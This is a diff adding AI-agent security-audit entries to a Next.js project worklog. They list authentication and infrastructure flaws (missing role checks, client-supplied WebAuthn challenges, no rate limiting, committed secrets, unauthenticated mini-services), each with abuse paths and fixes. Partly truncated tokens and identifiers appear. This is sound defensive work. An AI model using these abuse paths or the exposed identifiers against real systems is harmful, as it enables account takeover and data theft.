@@ -9771,3 +9771,1517 @@ Stage Summary:
 - Mobile "More" sheet: now includes "Insights" (listening) in the primary grid.
 - "Performance" (team-performance) stays in the More sheet admin section,
   unchanged.
+
+---
+Task ID: SECURITY-AUTH
+Agent: security-auditor
+Task: Audit the authentication & authorization security layer of the Next.js app at /home/z/my-project
+
+Work Log:
+- Read /home/z/my-project/worklog.md for prior context (SEC-4/5/6 already shipped: OAuth state HMAC signing, AES-256-GCM mail passwords, httpOnly + sameSite=strict cookie, /api/users PATCH tenant scoping + manager→admin escalation guard, /api/customers dbUrl leak fix).
+- Audited the following files in full:
+  - src/middleware.ts (global Edge JWT verification + security headers)
+  - src/lib/auth-session.ts (issueSession, setAuthCookie, revokeSessionByToken)
+  - src/lib/auth-guard.ts (requireAuth, requireAuthWithSession, requireRole, getTenantScope, tenantWhere, ROLE_HIERARCHY)
+  - src/lib/auth-store.ts (client Zustand store, persists token in localStorage under key "socialflow-auth")
+  - src/lib/2fa-temp-token.ts (5-minute signed JWT for 2FA login handoff)
+  - src/lib/totp.ts (custom RFC 6238 TOTP impl using node:crypto)
+  - src/lib/tenant-db.ts (per-customerId PrismaClient cache, getDbForUser)
+  - src/lib/oauth-state.ts (HMAC-SHA256 signed OAuth state — already fixed in SEC-5)
+  - src/lib/email.ts (sendVerificationEmail + buildAppUrl)
+  - src/app/api/auth/login/route.ts
+  - src/app/api/auth/signup/route.ts
+  - src/app/api/auth/demo/route.ts
+  - src/app/api/auth/me/route.ts
+  - src/app/api/auth/logout/route.ts
+  - src/app/api/auth/2fa/{setup,verify,disable,login}/route.ts
+  - src/app/api/auth/forgot-password/route.ts
+  - src/app/api/auth/reset-password/route.ts
+  - src/app/api/auth/verify-reset-token/route.ts
+  - src/app/api/auth/verify-email/route.ts
+  - src/app/api/auth/verify-email/confirm/route.ts
+  - src/app/api/auth/sessions/route.ts
+  - src/app/api/auth/sessions/[id]/route.ts
+  - src/app/api/webauthn/register/{options,verify}/route.ts
+  - src/app/api/webauthn/authenticate/{options,verify}/route.ts
+  - src/app/api/team/[id]/route.ts (no auth guard!)
+  - src/app/api/team/route.ts
+  - src/app/api/users/route.ts (cross-check role escalation guards added in SEC-6)
+  - src/app/api/admin/route.ts (requireRole admin — correct)
+  - prisma/schema.prisma (User/Session/PasswordResetToken/EmailVerificationToken/WebAuthnCredential/TenantDatabase models)
+  - .env.example (JWT_SECRET, ENCRYPTION_KEY, SCHEDULER_API_KEY, ENABLE_DEMO)
+- Confirmed via ripgrep that `requireAuthWithSession` is defined at src/lib/auth-guard.ts:114 but NEVER called anywhere in the codebase (all routes use the JWT-only `requireAuth`). This means DB-backed session revocation is advisory-only until the JWT itself expires.
+- Confirmed `next-auth` is listed in package.json:79 but is unused (no `[...nextauth]` route, no `getServerSession` calls anywhere). Dead dependency — not a vulnerability itself, just attack surface.
+- Confirmed no rate-limiting/throttle layer anywhere in src/ (ripgrep for `rate.?limit|throttle` returned only `account-safety.tsx`, `team-performance/route.ts`, `ai/assistant/route.ts`, and `terms/page.tsx` — all UI/data references, not auth throttling).
+- Confirmed no CSRF token mechanism beyond `sameSite: "strict"` cookie (ripgrep `csrf|CSRF|csrfToken` returned only `oauth/connect/[platform]/route.ts` + `lib/oauth-state.ts`, both for OAuth state, not general CSRF).
+
+Findings (sorted by severity):
+
+### CRITICAL
+
+**C1. `PATCH /api/team/[id]` and `DELETE /api/team/[id]` have NO authentication guard at all**
+File: `src/app/api/team/[id]/route.ts:9-75`
+The file does not import `requireAuth` or `requireRole`. The global middleware (`src/middleware.ts`) verifies the JWT signature, but ANY authenticated user — including the read-only demo viewer (role=viewer, demo@synque.app) — can:
+  - PATCH any user (including admins) to set `role: "admin"` → instant self-escalation to admin.
+  - PATCH any user to `status: "suspended"` → denial of service on any account.
+  - DELETE any user (including admins), with optional `?reassignTo=` to reassign their accounts.
+There is NO tenant scoping on the target user — a tenant-A user can target a tenant-B user by guessing the cuid. Compare with the sibling `/api/team` POST which correctly calls `requireRole(req, "manager")` (`src/app/api/team/route.ts:54`). The `[id]` route was clearly missed when SEC-6 added tenant scoping.
+**Fix:** add `const { user, error } = requireRole(req, "manager"); if (error) return error;` at the top of both PATCH and DELETE. Then enforce (a) the target user belongs to the caller's tenant (use `findFirst({ where: { id, ...tenantWhere(scope) }})`) and (b) the caller cannot raise the target above their own role level (mirror the `ROLE_LEVELS` check from `src/app/api/users/route.ts:96-109`).
+
+**C2. WebAuthn challenge is NOT stored server-side — accepted from the client**
+Files:
+  - `src/app/api/webauthn/register/verify/route.ts:31` — `expectedChallenge: body.expectedChallenge || ""`
+  - `src/app/api/webauthn/authenticate/verify/route.ts:43` — `expectedChallenge: body.expectedChallenge || authResponse.response?.challenge || ""`
+The `expectedChallenge` is sent from the browser and trusted verbatim. The entire point of the WebAuthn challenge is to prevent replay; accepting it from the client defeats replay protection entirely. An attacker who captures one valid assertion (e.g., from logs, a MitM, or a leaked referrer) can replay it indefinitely. The `/register/options` route (`src/app/api/webauthn/register/options/route.ts:53-58`) even has a comment "Store the challenge temporarily (60s expiry via a simple in-memory store) / In production, use Redis or DB — for now we return it and verify in the next step" — but the storage step was never implemented.
+**Fix:** store the generated challenge server-side (Redis, a DB table, or even a signed short-lived JWT with `type: "webauthn-challenge"`, userId, and 60s expiry — same pattern as `src/lib/2fa-temp-token.ts`). In `/verify`, look up the stored challenge by userId+challenge and delete it after a single use. Reject any request whose `body.expectedChallenge` does not match the stored value.
+
+**C3. No rate limiting on any auth endpoint — 2FA code brute-forceable; password brute-forceable**
+Files: `src/app/api/auth/login/route.ts`, `src/app/api/auth/2fa/login/route.ts`, `src/app/api/auth/signup/route.ts`, `src/app/api/auth/forgot-password/route.ts`, `src/app/api/webauthn/authenticate/verify/route.ts`, `src/app/api/auth/reset-password/route.ts`
+- The 2FA temp token (`src/lib/2fa-temp-token.ts:18`) is valid for 5 minutes. The TOTP code is 6 digits = 1,000,000 possibilities, and `verifyTotp` accepts ±1 window (3 codes valid at once). At a modest 50 req/s an attacker can exhaust all 1M codes in ~6 minutes — within the temp-token window. No lockout, no exponential backoff, no per-IP or per-user throttle.
+- `/api/auth/login` accepts unlimited password attempts against any email. bcrypt cost 12 (~250 ms per hash) is a partial brake but not a substitute for rate limiting.
+- `/api/auth/forgot-password` can be spammed to mail-bomb arbitrary inboxes (each call sends an email if a mail server is configured).
+**Fix:** add a per-IP + per-identifier sliding-window limiter (e.g., `@upstash/ratelimit` with Redis, or a simple in-memory token bucket per identifier). Suggested thresholds: login 10/min/IP + 5/min/email; 2FA verify 5/min/tempToken; forgot-password 3/hour/email; signup 5/hour/IP.
+
+### HIGH
+
+**H1. Stale JWT claims bypass role downgrade + tenant reassignment for up to 7 days**
+Files: `src/lib/auth-session.ts:46-50` (JWT payload: `{ userId, email, role, customerId }`), `src/lib/auth-guard.ts:20-48` (`getUserFromRequest` reads role + customerId straight from the JWT without consulting the DB).
+If an admin's role is downgraded to `member`, or a user is moved from tenant A to tenant B, their existing JWT continues to authorize them at the old privilege level until the 7-day expiry. `requireAuthWithSession` (defined at `src/lib/auth-guard.ts:114`) was meant to fix this by consulting the Session table, but it is NEVER called anywhere — every API route uses the JWT-only `requireAuth`.
+**Fix:** either (a) call `requireAuthWithSession` on every sensitive write route (admin/team/users PATCH, billing, API-key generation, account deletion) and additionally re-fetch the user's `role`+`customerId` from the DB to compare against the JWT claims; or (b) shorten the JWT TTL to ~15 minutes and issue a refresh token, so stale claims age out quickly. At minimum, on role/customerId change, call `revokeSessionByToken` for ALL of the user's sessions (`db.session.updateMany({ where: { userId, revokedAt: null }, data: { revokedAt: new Date() }})`) — `reset-password` already does this (`src/app/api/auth/reset-password/route.ts:90-93`); the same pattern must be applied in `PATCH /api/users` and `PATCH /api/team/[id]` whenever `role` or `customerId` changes.
+
+**H2. 2FA can be disabled without a TOTP code**
+File: `src/app/api/auth/2fa/disable/route.ts:47-55`
+The verification block is conditional: `if (body.code && user.totpSecret) { verify ... }`. If the attacker (who has a stolen JWT, e.g., via XSS or a leaked token from localStorage) simply omits `code` from the request body, the verification is skipped and 2FA is disabled. Worse, `POST /api/auth/2fa/setup` (`src/app/api/auth/2fa/setup/route.ts:43-50`) ALSO sets `twoFactorEnabled: false` and overwrites `totpSecret` — so a stolen session can call `setup` then `disable` and silently strip 2FA in two requests.
+**Fix:** make the TOTP code MANDATORY for disable when 2FA is currently enabled. Reject with 400 if `!body.code` and `user.twoFactorEnabled`. Optionally require re-entry of the account password (re-verify with `bcrypt.compare`) for both `setup` and `disable` to defend against pure session theft.
+
+**H3. `forgot-password` and `verify-email` leak reset/verification URLs in the HTTP response body when no mail server is configured**
+Files: `src/app/api/auth/forgot-password/route.ts:81-88` (returns `resetUrl` in JSON), `src/app/api/auth/verify-email/route.ts:76-82` (returns `verifyUrl`), `src/lib/email.ts:100-107` (sendVerificationEmail always returns `verifyUrl`).
+If `MAIL_SERVER` is not configured in production (e.g., misconfigured deploy, mail server down at signup time), the 1-hour-lived reset token and the 24-hour-lived verification token are echoed back in the JSON response to the unauthenticated caller. Anyone who can hit `/api/auth/forgot-password` with a known email gets a working password-reset link in the response.
+**Fix:** in production (`NODE_ENV === "production"`), NEVER surface `resetUrl` / `verifyUrl` in the response body — return only `{ ok: true, message: "..." }`. Only expose the URL when `NODE_ENV !== "production"`. Gate with `if (process.env.NODE_ENV === "production") return NextResponse.json({ ok: true, message: "If an account with that email exists, a reset link has been sent." });`
+
+**H4. Demo endpoint credentials hardcoded in source + demo user persists with known password**
+File: `src/app/api/auth/demo/route.ts:10-11` — `DEMO_EMAIL = "rabia@synque.app"; DEMO_PASSWORD = "demo123456"`.
+The demo route is gated behind `NODE_ENV === "production" && ENABLE_DEMO !== "true"` (line 104), so by default it 403s in production. But: once the demo user is created (during a single non-prod run, or if ENABLE_DEMO was ever toggled true), the row persists in the production database with bcrypt-hashed `demo123456`. Anyone who learns the email (it's in this source file, which is shipped to the client bundle? No — it's server-side only, but is in the repo) and the password (`demo123456`, also in the repo) can log in via the public `/api/auth/login` endpoint — which has no "is this the demo user?" guard. The demo user has role `viewer` (read-only) but still gets a valid 7-day JWT granting read access to every tenant's data via `tenantWhere` (the demo user is created WITHOUT `customerId`, so `getTenantScope` returns `isSuperAdmin: true` because `user.role === "admin" && !user.customerId` — wait, the demo user has role `viewer`, not `admin`, so this branch is not triggered; the demo user has `customerId: null` and `role: "viewer"`, so `getTenantScope` returns `{ customerId: null, isSuperAdmin: false }` and the tenantWhere filter becomes `{ customerId: null }`, which returns only null-customerId rows). Still, the demo user with a known password is a permanent unauthenticated read surface.
+**Fix:** rotate the demo password to a high-entropy random value stored in env (`DEMO_PASSWORD` env var, generated with `openssl rand -base64 24`), OR add a runtime check in `/api/auth/login` that rejects `email === DEMO_EMAIL` unless `ENABLE_DEMO === "true"`, OR delete the demo user row at deploy time. Also: when the demo user is created, set a `customerId` so they are tenant-scoped (currently `customerId` is left null → reads `customerId: null` rows).
+
+**H5. WebAuthn `/authenticate/options` returns ALL credential IDs across ALL users when no email is supplied**
+File: `src/app/api/webauthn/authenticate/options/route.ts:17-35`
+The unauthenticated branch returns `allowCredentials: [every WebAuthnCredential.id in the database]`. This is a global user/credential enumeration primitive. Combined with C2 (no real challenge enforcement), an attacker could enumerate credential IDs, then replay captured assertions.
+**Fix:** for the "no email" discoverable-credentials flow, return `allowCredentials: []` and let the browser's passkey UI find a matching resident credential. The current behavior of broadcasting every credential ID is unnecessary and leaks user/credential metadata.
+
+### MEDIUM
+
+**M1. `requireAuthWithSession` is dead code — DB-backed revocation never enforced**
+File: `src/lib/auth-guard.ts:114-160`
+The function exists (with a careful DB lookup + revocation/expiry checks) but is not invoked by a single route handler. The `/api/auth/sessions/[id]` DELETE route (`src/app/api/auth/sessions/[id]/route.ts:45-48`) does set `revokedAt` on the session row, but since no route calls `requireAuthWithSession`, the revoked session's JWT continues to authorize requests until its 7-day expiry. Logout is similarly advisory.
+**Fix:** either delete the function (acknowledge that revocation is best-effort) or wire it into all state-changing routes — at minimum: `/api/users` PATCH, `/api/team` POST, `/api/team/[id]` PATCH/DELETE, `/api/auth/2fa/*`, `/api/auth/sessions/[id]` DELETE, `/api/admin` GET, `/api/api-keys` POST/DELETE, `/api/accounts/[id]/protection`, billing routes. Sensitivity-tier the routes and use `requireAuthWithSession` only for the high-risk tier.
+
+**M2. Cross-tenant write via `PATCH /api/users`**
+File: `src/app/api/users/route.ts:54-145`
+SEC-6 correctly added tenant scoping to GET (`tenantWhere(scope)`) and added role/permission self-escalation guards. But PATCH only checks `isSelf || canManageOthers` — it does NOT verify the target `id` belongs to the caller's tenant. A tenant-A admin can PATCH a tenant-B user's `email`, `password`, `role`, `permissions`, `status` by passing the target's cuid.
+**Fix:** before `db.user.update`, fetch the target with `findFirst({ where: { id, ...tenantWhere(scope) }})`. If null, return 404 (don't reveal that the user exists in another tenant). Same fix needed in DELETE (which currently uses `requireRole("admin")` but no tenant check).
+
+**M3. Password change in `PATCH /api/users` does not require the current password**
+File: `src/app/api/users/route.ts:136-138`
+`if (typeof password === "string" && password.length >= 8) data.password = await bcrypt.hash(password, 12);` — no `currentPassword` verification. A stolen JWT (or an attacker on a shared machine who finds the tab still logged in) can change the user's password in one request, locking them out. Also note the threshold is 8 chars here but only 6 chars in `/api/auth/signup` (`src/app/api/auth/signup/route.ts:26`) and `/api/auth/reset-password` (`src/app/api/auth/reset-password/route.ts:27`) — inconsistent password policy.
+**Fix:** require `currentPassword` in the body when `password` is supplied; verify with `bcrypt.compare(currentPassword, user.password)` and reject with 401 on mismatch. Also unify the minimum length to 8 across signup/reset/users (or move to a shared `validatePassword()` helper).
+
+**M4. Signup returns 409 on duplicate email — user enumeration**
+File: `src/app/api/auth/signup/route.ts:33-36`
+Returns `"An account with this email already exists"` with 409. This is the standard account-enumeration anti-pattern. (Note: `/api/auth/login` correctly returns a generic `"Invalid email or password"` for both unknown-user and wrong-password — `src/app/api/auth/login/route.ts:52-60` — so login is OK.)
+**Fix:** on duplicate email, send a "you already have an account — click here to log in or reset your password" email to that address, and return a generic 200 success response to the caller. Don't reveal the duplicate state via the HTTP status code.
+
+**M5. Login timing oracle — user enumeration via response time**
+File: `src/app/api/auth/login/route.ts:21-60`
+The DB lookup is fast; `bcrypt.compare` takes ~250 ms (cost 12). When the email is unknown, `bcrypt.compare` is never called, so the response is much faster than for a known email with a wrong password. An attacker can distinguish "user does not exist" (fast) from "user exists, wrong password" (slow) by timing.
+**Fix:** always run a dummy `bcrypt.compare` against a fixed precomputed hash when the user is not found, so both paths take roughly the same time. Constant-time response is the goal.
+
+**M6. Session row creation is best-effort — login can succeed with no revocable session**
+File: `src/lib/auth-session.ts:61-73`
+The `db.session.create` is wrapped in `.catch(...)` and only logs on failure. If the DB is briefly unavailable (Neon cold-start, network blip), login still returns a valid 7-day JWT — but there is no Session row to revoke. The user cannot be logged out via `revokeSessionByToken` or `/api/auth/sessions/[id]` DELETE.
+**Fix:** if you want revocation to be a real security control, the session row creation must be transactional with login — fail login if the session can't be persisted. If you accept that revocation is best-effort, document it clearly. Right now the codebase talks the talk (sessions table, revoke endpoints) but doesn't walk the walk.
+
+**M7. `secure` cookie flag only set in production — staging environments send JWT over HTTP**
+File: `src/lib/auth-session.ts:101`
+`secure: process.env.NODE_ENV === "production"`. On staging/preview deployments that use HTTPS but run with `NODE_ENV !== "production"` (rare but possible), the cookie is sent over plain HTTP if the user types `http://`. Also note: Vercel preview deployments run with `NODE_ENV=production`, so this is mostly a non-issue there — but for any non-Vercel staging it can leak.
+**Fix:** set `secure: true` whenever the request URL is `https://` (check `req.url` or the `x-forwarded-proto` header in `setAuthCookie`), independent of NODE_ENV.
+
+### LOW / INFORMATIONAL
+
+**L1. No JWT secret rotation support**
+Files: `src/middleware.ts:16`, `src/lib/auth-session.ts:12`, `src/lib/auth-guard.ts:5`, `src/lib/2fa-temp-token.ts:14`, `src/app/api/auth/me/route.ts:5`, `src/lib/oauth-state.ts:17`
+All six sites read `process.env.JWT_SECRET` (single secret). If the secret leaks (e.g., env file committed, log accidentally printed), all 7-day JWTs are forgeable. There is no `JWT_SECRET_PREVIOUS` env var for graceful rotation: rotating the secret immediately invalidates all sessions, which is operationally painful.
+**Fix:** support a comma-separated `JWT_SECRETS=old,new` env var; verify with any of them but sign with the first. Allows zero-downtime rotation. Document the rotation procedure in `.env.example`.
+
+**L2. Logout cookie is set with `httpOnly: false` and `sameSite: "lax"`**
+File: `src/app/api/auth/logout/route.ts:25-31, 42-48`
+The cookie-clearing response sets the cookie with weaker flags than `setAuthCookie` does. Since the value is empty and maxAge=0, the practical impact is nil — but it's inconsistent with `setAuthCookie` and could mislead future readers.
+**Fix:** set `httpOnly: true, sameSite: "strict"` to match `setAuthCookie`.
+
+**L3. Signup auto-logs in the user before email verification**
+File: `src/app/api/auth/signup/route.ts:77-78`
+The new user (with `emailVerified: null`) is immediately issued a 7-day JWT. The `emailVerified` flag is surfaced to the UI as a banner, but no API route checks `emailVerified` before granting sensitive access. An attacker who signs up with a victim's email gets a working session immediately, and if they never verify, the row lingers.
+**Fix:** either (a) require email verification before issuing the session (return `{ requiresVerification: true }` and force a second step), or (b) tier access: unverified users can only call `/api/auth/verify-email` and `/api/auth/me`; all other routes return 403 until `emailVerified` is set.
+
+**L4. `2fa/setup` overwrites existing secret without verification**
+File: `src/app/api/auth/2fa/setup/route.ts:43-50`
+A user with 2FA currently enabled can call `setup` again, which silently replaces their `totpSecret` and sets `twoFactorEnabled: false` until they re-verify. If they don't complete the verify step, they're left with 2FA disabled and a brand-new secret they don't have in their authenticator. Combined with H2 (disable without code), this is a session-theft amplification path.
+**Fix:** if `user.twoFactorEnabled === true`, require a valid TOTP code (or current password) before allowing `setup` to overwrite the secret. Better: refuse `setup` while 2FA is enabled; require `disable` first.
+
+**L5. `/api/auth/me` returns 200 with `{ user: null }` on invalid token**
+File: `src/app/api/auth/me/route.ts:14-16, 40-47`
+Inconsistent with the rest of the API (which returns 401 for invalid tokens). The frontend tolerates it (auth-store treats `data.user` as falsy), but it makes monitoring/alerting harder.
+**Fix:** return 401 for invalid Bearer tokens; return 200 with `{ user: null }` only when no Authorization header is present.
+
+**L6. `/api/auth/verify-reset-token` exposes the user's email to anyone with the token**
+File: `src/app/api/auth/verify-reset-token/route.ts:52-55`
+Returns `{ valid: true, email: resetRecord.email }`. The token is 32 random hex bytes (256-bit entropy, 1-hour TTL) so brute-force is infeasible, but the email disclosure is unnecessary — the reset form doesn't need to know the email to render the password fields.
+**Fix:** drop the `email` field from the response. The "Resetting password for {email}" UX can be satisfied by having the user type their email in the forgot-password step and displaying it client-side.
+
+**L7. WebAuthn `requireUserVerification: false` on both register and authenticate**
+Files: `src/app/api/webauthn/register/verify/route.ts:34`, `src/app/api/webauthn/authenticate/verify/route.ts:54`
+The server does not require the authenticator to perform user verification (biometric/PIN). A non-UV-protected authenticator (e.g., a lost hardware token with no PIN) can register and authenticate. For a product targeting "Face ID / Touch ID" UX, UV should be required.
+**Fix:** set `requireUserVerification: true` on both. If backward-compat with existing non-UV credentials is needed, gate by `credential.backedUp === true` (multi-device credentials) and migrate.
+
+**L8. Stale tenant DB client cache**
+File: `src/lib/tenant-db.ts:9-33`
+The `tenantCache: Map<customerId, PrismaClient>` is global and never expires. If a `TenantDatabase.dbUrl` is rotated (admin updates credentials), the old `PrismaClient` with the old connection string remains in the cache, serving stale connection info or failing. There is `invalidateTenantDb` (line 41) but it's not called from any DB-update route.
+**Fix:** call `invalidateTenantDb(customerId)` whenever a `TenantDatabase` row is updated or deleted (e.g., from the admin panel). Consider a TTL on the cache entries.
+
+**I1. `next-auth` declared as a dependency but unused**
+File: `package.json:79`
+Not a vulnerability, but adds to the dependency attack surface (supply-chain risk). Remove it or document why it's retained.
+
+**I2. Auth-store persists JWT in localStorage under key `socialflow-auth`**
+File: `src/lib/auth-store.ts:228-235`
+The `httpOnly` cookie is the primary auth token (good — not readable from JS), but `auth-store.ts` ALSO stores the JWT in localStorage so the client can attach `Authorization: Bearer` headers for `fetch` calls. Any XSS vulnerability in the app exposes the localStorage JWT to theft, independent of the httpOnly cookie. The Bearer-token path exists because the cookie path is `sameSite: "strict"`, which is fine for first-party fetches — so the Bearer path is actually unnecessary.
+**Fix:** drop the `Authorization: Bearer` header from client fetches and rely on the httpOnly cookie (the middleware already accepts both). Remove `token` from the persisted store shape. This eliminates the XSS-token-theft vector entirely.
+
+Stage Summary:
+- 1 Critical (C1) auth-bypass in `/api/team/[id]` allows any authenticated user — including the demo viewer — to escalate themselves to admin or delete any user. Immediate fix required.
+- 2 additional Critical findings (C2 WebAuthn challenge not enforced; C3 zero rate limiting on auth endpoints) each independently allow account takeover via 2FA brute-force or password brute-force.
+- 5 High findings: stale-JWT-claims bypass (H1), 2FA disable without code (H2), reset/verify URLs leaked in HTTP response body when no mail server (H3), hardcoded demo credentials (H4), WebAuthn global credential enumeration (H5).
+- 7 Medium findings cover dead-code revocation, cross-tenant PATCH /api/users, password-change without current-password, signup user enumeration, login timing oracle, best-effort session persistence, insecure cookie flag in staging.
+- 8 Low/Info findings on JWT rotation, logout cookie flags, signup auto-login, 2FA setup secret overwrite, /api/auth/me response code, reset-token email disclosure, WebAuthn UV disabled, stale tenant-DB cache, unused next-auth dep, localStorage JWT.
+- No code changes were made by this audit task — findings are reported for prioritized remediation. Recommend splitting into follow-up tasks SEC-AUTH-1 (C1, H1, M1 — fix team/[id] + wire up requireAuthWithSession + revoke sessions on role change), SEC-AUTH-2 (C2, C3, H5 — WebAuthn challenge store + rate limiting + drop allowCredentials broadcast), SEC-AUTH-3 (H2, H3, H4, L3, L4 — 2FA hardening + token-URL gating + demo credential rotation + signup verification gate).
+
+---
+
+## Task ID: SECURITY-INFRA
+
+**Agent**: security-auditor (general-purpose)
+**Task**: Audit SECRETS MANAGEMENT, HTTP SECURITY HEADERS, and INFRASTRUCTURE security of the Next.js app at `/home/z/my-project`. Covers `.env`, `next.config.ts`, `src/middleware.ts`, `Caddyfile`, `prisma/schema.prisma`, `package.json`, `mini-services/`, WebSocket / socket.io, PWA service worker, storage layer, error handling, and logging.
+
+### Methodology
+- Static review of all named config + infra files.
+- `bun audit` (97 vulnerabilities found).
+- `git log --all -p -- .env` to inspect history of secret-bearing files.
+- `rg` greps for `Access-Control-Allow-Origin`, `console.log` near auth code, hardcoded API keys / tokens, `Content-Security-Policy`, rate limiting.
+- Read prior security tasks (SEC-4, SEC-5, SEC-6) to avoid re-reporting already-fixed issues.
+
+### Findings (sorted by severity, file:line citations)
+
+---
+
+#### 🔴 CRITICAL — Production secrets committed to git history (10+ commits)
+
+**Files**: `.env` (deleted in `c817a11bdfbfd225f86298fc0aaf7aa3ae7f4ff9` but full contents visible in `git log`); also leaked in 9+ earlier commits.
+
+**Evidence** (`git log --all -p -- .env` shows the following secrets in plain text):
+- `DATABASE_URL=postgresql://neondb_owner:REDACTED_DB_PASSWORD@ep-spring-darkness-auk3ozf9-pooler.c-10.us-east-1.aws.neon.tech/neondb?sslmode=require` — Neon DB password `REDACTED_DB_PASSWORD`
+- `JWT_SECRET=REDACTED_JWT_SECRET`
+- `ENCRYPTION_KEY=REDACTED_ENCRYPTION_KEY` (AES-256-GCM key for mail passwords at rest)
+- `SCHEDULER_API_KEY=REDACTED_SCHEDULER_KEY`
+- `ZAI_TOKEN=eyJhbGciOiJIUzI1NiIs...rVhhVlYSk8zQsc2RF56Qri9vv8wtKsJd2UWyLJ1XBqE` (Z.AI JWT bearer)
+- `ZAI_USER_ID=28fee991-673c-4476-b4e6-d9caaadf9ed5`
+- `CLOUDINARY_API_SECRET=REDACTED_CLOUDINARY_SECRET`
+- Two prior JWT secrets also leaked: `REDACTED` and `REDACTED` (older commits).
+
+The current `.env` on disk contains the **same live production secrets** (verified by reading `/home/z/my-project/.env`), so these are not historical-only — they are actively in use by the deployed Vercel app + Railway mini-services + Neon DB.
+
+**Impact**: Anyone with read access to the repo can decrypt every mail password (ENCRYPTION_KEY), forge JWTs (JWT_SECRET), impersonate the scheduler (SCHEDULER_API_KEY), use the Cloudinary account (CLOUDINARY_API_SECRET), and connect to the production Neon database directly (`REDACTED_DB_PASSWORD`).
+
+**Fix**:
+1. Rotate EVERY leaked secret NOW (Neon DB password, JWT_SECRET, ENCRYPTION_KEY, SCHEDULER_API_KEY, CLOUDINARY_API_SECRET, ZAI_TOKEN). Old values must be considered burned.
+2. Re-encrypt or re-store all mail-password rows in DB (existing ciphertext was encrypted with the leaked ENCRYPTION_KEY).
+3. Purge `.env` from git history using `git filter-repo --invert-paths --path .env` (or BFG) and force-push; ALL contributors must re-clone.
+4. Add a pre-commit hook (`detect-secrets` or `gitleaks`) to prevent recurrence.
+
+---
+
+#### 🔴 CRITICAL — Hardcoded Z.AI credentials in zai-proxy source code
+
+**File**: `mini-services/zai-proxy/index.js:13-16`
+
+```js
+const API_KEY = "Z.ai";
+const CHAT_ID = "chat-b8e092a6-6649-4a04-b709-d6b3d6038f56";
+const TOKEN = "eyJhbGciOiJIUzI1NiIs...rVhhVlYSk8zQsc2RF56Qri9vv8wtKsJd2UWyLJ1XBqE";
+const USER_ID = "28fee991-673c-4476-b4e6-d9caaadf9ed5";
+```
+
+These are baked into the deployed image — not read from `process.env`. They are the same Z.AI JWT bearer token that was leaked via `.env` history. They are committed in source so they will continue to be live even after rotating env vars.
+
+**Fix**: Replace constants with `process.env.ZAI_*` reads (mirror `mini-services/ai-service/index.js:10-14`), and rotate the Z.AI token because it's already exposed.
+
+---
+
+#### 🔴 CRITICAL — WhatsApp mini-service has ZERO authentication
+
+**File**: `mini-services/whatsapp-service/index.ts:75-87, 311-434` (also compiled `index.js:280-360`)
+
+The entire service is unauthenticated. CORS is `Access-Control-Allow-Origin: *` (`index.ts:78`, `index.js:281`). The only identifier is `?ownerId=xxx` or `X-Owner-Id` header, **both attacker-supplied** with no JWT verification. Endpoints exposed:
+
+- `GET /qr?ownerId=<any>` — retrieve the WhatsApp QR code for ANY user's session and pair an attacker device with their account (`index.ts:352-360`).
+- `GET /status?ownerId=<any>` — read another user's phone number + connection state (`index.ts:340-348`).
+- `POST /webhook-target?ownerId=<any>` — **hijack where another user's incoming WhatsApp messages are forwarded** (`index.ts:364-368`). Critical for confidentiality.
+- `POST /send?ownerId=<any>` — send WhatsApp messages impersonating ANY user (`index.ts:401-431`).
+- `POST /logout?ownerId=<any>` — disconnect / DoS another user (`index.ts:372-384`).
+- `GET /sessions` — list ALL sessions with phone numbers (`index.ts:320-329`).
+- `POST /restart?ownerId=<any>` — force reconnect, generating a fresh QR for the attacker (`index.ts:387-398`).
+
+The Dockerfile (`mini-services/whatsapp-service/Dockerfile:11`) copies `index.js` (the simpler single-session version), which has the same problem at `index.js:280-360` — endpoints `GET /status`, `POST /webhook-target`, `POST /sync`, `POST /restart`, `POST /logout` are all open.
+
+**Fix**: Add a shared-secret middleware. Reuse `SCHEDULER_API_KEY` (or a new `WHATSAPP_SERVICE_KEY`) — every request must present `X-Service-Key` matching the env value; reject with 401 otherwise. Restrict CORS to the app's domain only (replace `*` with the `APP_URL` origin). Tenant isolation: validate `ownerId` against the JWT-decoded user, not against the attacker-supplied header.
+
+---
+
+#### 🔴 CRITICAL — AI mini-service has ZERO authentication + logs API key
+
+**File**: `mini-services/ai-service/index.js:16-22, 53-55, 74`
+
+- `POST /chat` is unauthenticated; CORS `Access-Control-Allow-Origin: *` (`index.js:53`). Anyone who can reach the Railway URL can use the project's Z.AI API key for free, running up the bill.
+- Lines 16-22 log the API key + chatId + userId + hasToken to stdout on every boot: `console.log("[ai-service] Config:", JSON.stringify({ baseUrl, apiKey: API_KEY, chatId, hasToken, userId }))`. Railway logs are visible to project members and may be shipped to third-party log aggregators.
+
+**Fix**: Require `X-Service-Key` header (same shared secret as WhatsApp). Strip the API key from the startup log (log only `hasToken: !!TOKEN`). Scope CORS to `APP_URL`.
+
+---
+
+#### 🔴 CRITICAL — zai-proxy mini-service has ZERO authentication + hardcoded secrets
+
+**File**: `mini-services/zai-proxy/index.js:18-22, 35`
+
+Same pattern as ai-service: `POST /chat` is open, CORS `*`, and the credentials are baked in (see prior critical finding). Anyone hitting `https://<railway>/chat` can call the Z.AI API.
+
+**Fix**: Move credentials to env vars, add `X-Service-Key` middleware, scope CORS.
+
+---
+
+#### 🔴 CRITICAL — Hardcoded scheduler API key fallback in compiled JS (still live on Railway)
+
+**File**: `mini-services/scheduler-service/index.js:1633` (compiled bundle that actually runs in production)
+
+```js
+"X-Scheduler-Key": process.env.SCHEDULER_API_KEY || "REDACTED"
+```
+
+SEC-5 fixed the **TypeScript source** (`index.ts:88`) by removing the fallback, but the compiled `index.js` — which is what Railway actually runs (per `package.json:scripts.start = "node index.js"`) — **was never regenerated**. Production still ships the hardcoded fallback. An attacker who reads the source (now public via the leaked repo) can call `POST /api/publish/<platform>` with `X-Scheduler-Key: REDACTED` to publish tweets/posts as any user, bypassing JWT auth entirely.
+
+**Fix**: Re-build the scheduler bundle (`tsc` or whatever produced `index.js`) and redeploy. Verify by inspecting `mini-services/scheduler-service/index.js` after rebuild — the `|| "REDACTED"` clause must be gone.
+
+---
+
+#### 🟠 HIGH — Demo login endpoint enabled in production
+
+**File**: `.env:7` (`ENABLE_DEMO=true`); gate logic at `src/app/api/auth/demo/route.ts:104`
+
+```ts
+if (process.env.NODE_ENV === "production" && process.env.ENABLE_DEMO !== "true") {
+  return NextResponse.json({ error: "Demo endpoint is disabled in production." }, { status: 403 });
+}
+```
+
